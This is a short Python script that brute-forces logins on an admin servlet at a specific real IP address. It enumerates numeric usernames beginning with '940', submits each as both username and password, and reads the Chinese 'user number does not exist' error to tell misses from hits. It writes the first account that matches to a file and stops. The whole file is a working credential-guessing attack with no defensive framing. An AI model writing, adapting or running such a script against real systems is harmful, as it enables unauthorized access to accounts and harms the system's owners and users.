#!/usr/bin/python3
# -*- coding: utf-8 -*-

import http.cookiejar
import re
import urllib

failed = '该用户编号不存在!'

cookie = http.cookiejar.CookieJar()
cjhdr  = urllib.request.HTTPCookieProcessor(cookie)
opener = urllib.request.build_opener(cjhdr)

login_url = "http://114.212.253.8:8080/servlet/adminservlet"

for i in range(3, 7):
    name_prefix = '940'
    for j in range(10 ** i):
        name = name_prefix+format(j, '0'+str(i)+'d')
        postdata = urllib.parse.urlencode({
            'displayName': '',
            'displayPasswd': '',
            'select': '1',
            'submit.x': '75',
            'submit.y': '7',
            'operType': '1',
            'userName': name,
            'passwd': name })
        postdata = postdata.encode('utf-8')
        req = opener.open(login_url, postdata)

        if req.status != 200:
            exit()

        page = req.read().decode('GB2312')
        # print(page)

        print(name)
        if failed not in page:
            with open('name.haha', 'w') as f:
                f.write(name)
            exit()
